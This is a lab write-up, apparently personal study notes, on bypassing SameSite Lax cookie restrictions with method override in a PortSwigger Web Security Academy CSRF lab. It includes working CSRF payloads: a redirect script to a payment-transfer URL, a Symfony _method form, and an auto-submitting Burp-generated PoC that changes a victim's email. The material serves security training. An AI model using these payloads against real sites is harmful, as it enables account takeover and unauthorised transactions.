- Sometimes, servers on the internet don't really care if you send them information using a "GET" or "POST" request, especially when you're sending data from a web form. They can handle both types of requests even if they were originally designed for one specific type.

- If they also use `Lax` restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a [CSRF attack](https://portswigger.net/web-security/csrf) by eliciting a `GET` request from the victim's browser.

**The following is one of the simplest approaches to launching such an attack:**
```js
<script> 
	document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; 
</script>
```
Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line.

**For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:**
```js
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">         <input type="hidden" name="_method" value="GET"> 
      <input type="hidden" name="recipient" value="hacker"> 
      <input type="hidden" name="amount" value="1000000"> 
</form>
```
Other frameworks support a variety of similar parameters.

## Steps to solve lab - 
### Title - SameSite Lax bypass via method override

**Desc** - This lab's change email function is vulnerable to CSRF. To solve the lab, perform a [CSRF attack](https://portswigger.net/web-security/csrf) that changes the victim's email address. You should use the provided exploit server to host your attack.

**Creds** - You can log in to your own account using the following credentials: `wiener:peter`

**Our end goal** - To solve the lab, perform a [CSRF attack](https://portswigger.net/web-security/csrf) that changes the victim's email address. You should use the provided exploit server to host your attack.

1. Analyse the website and check that three key conditions must be in place for a CSRF attack to be possible:
After analysing the site, we come across a endpoint where it is possible to change the email of a user. So, change your email and at the same time intercept it with burpsuite and sent it to Repeater.
![[csrf52.png]]
   - A relevant action - email change functionality.
   - Cookie based session handling.
   - No unpredictable request parameters - Satisfied(As you can see, there is no CSRF token that we can't predict it).

2. Now, we are going to create "CSRF POC" script with the help of burpsuite pro and for that right click on the request that we captured earlier with the help of burpsuite pro do the below steps:
"Engagement tools" > "Generate CSRF PoC"
![[csrf53.png]]

**After doing the above steps, there is a new window pop up.**
![[csrf54.png]]
In this window, click on "Options" and make sure to select first and last options and click "Regenerate" and copy the script.

3. Now, change the method in the form tag to "GET" because chrome browser by default enforce lax restriction on cross site requests(Lax restriction only allow request if request is sent with method as GET) and add the below code just below to form tag to pass the parameters.
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8a005504bd85b680d2495900520080.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST"> 
	  <input type="hidden" name="email" value="sukuna&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
_method just override the method of form tag to "POST".

![[csrf55.png]]

